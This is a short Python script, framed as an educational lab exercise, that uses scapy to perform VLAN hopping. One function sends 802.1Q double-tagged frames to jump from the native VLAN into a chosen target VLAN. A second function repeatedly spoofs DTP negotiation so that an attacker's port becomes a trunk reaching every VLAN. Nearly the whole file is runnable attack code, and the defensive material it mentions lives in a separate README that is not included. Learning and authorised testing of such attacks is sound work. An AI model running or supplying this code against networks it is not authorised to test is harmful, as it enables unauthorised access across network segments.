#!/usr/bin/env python3
"""VLAN hopping via 802.1Q double-tagging and DTP trunk spoofing.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

This is a legacy learning exercise, refactored to modern Python 3 for
readability. It is a reference implementation, not a turnkey tool.
"""

from __future__ import annotations

import time

from scapy.all import ICMP, IP, Dot1Q, Ether, sendp
from scapy.contrib import dtp

# The outer tag must match the trunk's native VLAN for the first switch to strip
# it; the inner tag is the VLAN the attacker is trying to reach.
NATIVE_VLAN = 1
DTP_NEGOTIATION_ROUNDS = 4
DTP_SETTLE_DELAY_S = 1        # pause between the first negotiation packets
DTP_TRUNK_FORM_DELAY_S = 30   # time to let the trunk come up before the last round


def double_tagging(target_ip: str, interface: str,
                   dest_mac: str, target_vlan: int) -> None:
    """Send a double-tagged ICMP packet so it hops from the native VLAN to *target_vlan*."""
    frame = (
        Ether(dst=dest_mac)
        / Dot1Q(vlan=NATIVE_VLAN)      # outer tag, stripped by the first switch
        / Dot1Q(vlan=target_vlan)      # inner tag, acted on by the next switch
        / IP(dst=target_ip)
        / ICMP()
    )
    sendp(frame, iface=interface, verbose=0)


def dtp_trunk_spoof(interface: str) -> None:
    """Impersonate a switch via DTP to negotiate a trunk and reach every VLAN."""
    for round_index in range(DTP_NEGOTIATION_ROUNDS):
        dtp.negotiate_trunk(iface=interface)
        # Give the switch time to form the trunk before the final confirmation.
        last_round = round_index == DTP_NEGOTIATION_ROUNDS - 2
        time.sleep(DTP_TRUNK_FORM_DELAY_S if last_round else DTP_SETTLE_DELAY_S)
